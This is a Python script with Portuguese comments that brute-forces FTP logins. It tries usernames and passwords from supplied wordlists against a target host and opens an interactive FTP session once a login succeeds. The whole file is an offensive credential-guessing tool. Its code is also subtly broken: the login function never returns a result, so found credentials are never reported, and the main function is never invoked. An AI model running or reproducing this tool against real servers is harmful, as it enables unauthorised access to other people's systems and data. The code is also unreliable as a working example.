import sys
import ftplib
import pexpect

def conectar_ftp(hostname, username, senha):
    try:
        # Cria uma conexão FTP
        ftp = ftplib.FTP(hostname)
        ftp.login(username, senha)
        print("Acesso FTP bem-sucedido!")

        # Cria uma instância do objeto pexpect para interagir com o console FTP
        ftp_console = pexpect.spawn('ftp')
        ftp_console.expect('ftp>')
        
        # Envia os comandos FTP para o console interativo
        ftp_console.sendline('open ' + hostname)
        ftp_console.expect('Name .*:')
        ftp_console.sendline(username)
        ftp_console.expect('Password:')
        ftp_console.sendline(senha)
        ftp_console.expect('ftp>')
        
        # Interage com o console FTP
        while True:
            comando = input("FTP> ")
            ftp_console.sendline(comando)
            ftp_console.expect('ftp>')
            print(ftp_console.before.decode('utf-8'))

    except ftplib.error_perm as e:
        print(f"[ * ] Acesso negado para {username}:{senha} [ * ]")
    except ftplib.all_errors as e:
        print("Erro na conexão FTP:", str(e))
    except pexpect.EOF:
        print("Conexão com o console FTP encerrada.")
    except pexpect.TIMEOUT:
        print("Tempo de espera excedido.")

def ftpbrute():
    hostname = None
    username = None
    senha = None
    lista_senhas = []
    lista_usuarios = []

    # Analisa os argumentos da linha de comando
    i = 1
    while i < len(sys.argv):
        if sys.argv[i] == '-p':
            senha = sys.argv[i + 1]
            i += 1
        elif sys.argv[i] == '-wp':
            with open(sys.argv[i + 1], 'r') as arquivo:
                lista_senhas = arquivo.read().splitlines()
            i += 1
        elif sys.argv[i] == '-u':
            username = sys.argv[i + 1]
            i += 1
        elif sys.argv[i] == '-wu':
            with open(sys.argv[i + 1], 'r') as arquivo:
                lista_usuarios = arquivo.read().splitlines()
            i += 1
        elif sys.argv[i] == '-h':
            hostname = sys.argv[i + 1]
            i += 1
        i += 1
    
    # Verifica se todos os parâmetros necessários foram fornecidos
    if hostname is None or (username is None and len(lista_usuarios) == 0):
        print("Uso: python ftp_brute.py -h hostname [-u username | -wu wordlist_usuarios] [-p senha | -wp wordlist_senhas]")
        sys.exit(1)
    
    if lista_usuarios:  # Se a wordlist de usuários foi fornecida
        for usuario in lista_usuarios:
            if lista_senhas:  # Se a wordlist de senhas foi fornecida
                for senha in lista_senhas:
                    if conectar_ftp(hostname, usuario, senha):
                        print("Credenciais corretas encontradas:")
                        print("Usuário:", usuario)
                        print("Senha:", senha)
                        break
                else:
                    continue
                break
            elif senha:  # Se a senha foi fornecida
                if conectar_ftp(hostname, usuario, senha):
                    print("Credenciais corretas encontradas:")
                    print("Usuário:", usuario)
                    print("Senha:", senha)
                    break
        else:
            print("Nenhuma combinação correta de usuário e senha encontrada nas wordlists.")
    elif username:  # Se o usuário foi fornecido
        if lista_senhas:  # Se a wordlist de senhas foi fornecida
            for senha in lista_senhas:
                if conectar_ftp(hostname, username, senha):
                    print("Credenciais corretas encontradas:")
                    print("Usuário:", username)
                    print("Senha:", senha)
                    break
            else:
                print("Nenhuma senha correta encontrada na wordlist.")
        elif senha:  # Se a senha foi fornecida
            conectar_ftp(hostname, username, senha)
        else:
            print("Uma senha ou uma wordlist de senhas deve ser fornecida.")

